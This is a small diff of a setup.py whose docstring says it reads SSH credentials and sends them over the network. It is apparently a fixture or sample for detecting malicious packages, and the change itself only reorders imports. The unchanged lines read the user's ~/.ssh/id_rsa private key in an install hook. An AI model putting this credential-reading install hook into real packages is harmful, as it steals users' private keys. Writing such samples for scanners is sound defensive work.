@@ -1,7 +1,8 @@
 """setup.py that reads SSH credentials and sends them over the network."""
-from setuptools import setup
 import os
 import socket
+
+from setuptools import setup
 
 # CRITICAL: reads credential file in install hook
 key = open(os.path.expanduser("~/.ssh/id_rsa")).read()
